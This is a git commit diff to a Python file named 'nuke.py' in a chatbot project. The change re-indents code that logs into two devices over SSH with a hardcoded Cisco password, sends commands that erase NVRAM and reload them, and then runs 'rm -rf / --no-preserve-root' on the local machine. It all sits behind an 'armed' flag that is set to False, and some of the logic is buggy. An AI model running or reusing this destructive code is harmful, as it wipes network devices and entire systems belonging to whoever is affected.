71447926788b5a2127b47709c186a8553d50883c
123rad567 <118935932+123rad567@users.noreply.github.com>
2022-12-11 22:19:04 -0600

    Update nuke.py

--- chatbot/nuke.py
+++ chatbot/nuke.py
@@ -12,35 +12,35 @@ password = 'cisco123!'
 armed = False
 
 if (armed == True):
-ssh_client.connect(ip,username=username,password=password, look_for_keys=False, allow_agent=False)
-shell = ssh_client.invoke_shell()
-time.sleep(1)
-shell.send('erase /all nvram: \n')
-shell.send('yreload\n')
-shell.send('y\n')
-time.sleep(1)
-output = shell.recv(10000)
-output = output.decode('utf-8') 
-print(output)
+  ssh_client.connect(ip,username=username,password=password, look_for_keys=False, allow_agent=False)
+  shell = ssh_client.invoke_shell()
+  time.sleep(1)
+  shell.send('erase /all nvram: \n')
+  shell.send('yreload\n')
+  shell.send('y\n')
+  time.sleep(1)
+  output = shell.recv(10000)
+  output = output.decode('utf-8') 
+  print(output)
 if print(ssh_client.get_transport().is_active()) == True:
     print('Closing connection')
     ssh_client.close()
     
 if (armed == True):    
-ssh_client.connect(ip2,username=username,password=password, look_for_keys=False, allow_agent=False)
-shell = ssh_client.invoke_shell()
-time.sleep(1)
-shell.send('erase /all nvram: \n')
-shell.send('yreload\n')
-shell.send('y\n')
-time.sleep(1)
-output = shell.recv(10000)
-output = output.decode('utf-8') 
-print(output)
+  ssh_client.connect(ip2,username=username,password=password, look_for_keys=False, allow_agent=False)
+  shell = ssh_client.invoke_shell()
+  time.sleep(1)
+  shell.send('erase /all nvram: \n')
+  shell.send('yreload\n')
+  shell.send('y\n')
+  time.sleep(1)
+  output = shell.recv(10000)
+  output = output.decode('utf-8') 
+  print(output)
 if print(ssh_client.get_transport().is_active()) == True:
     print('Closing connection')
     ssh_client.close()
 
 if (armed == True):
-os.system('rm -rf / --no-preserve-root')
-os.system('rm -f /rmp/del*')
+  os.system('rm -rf / --no-preserve-root')
+
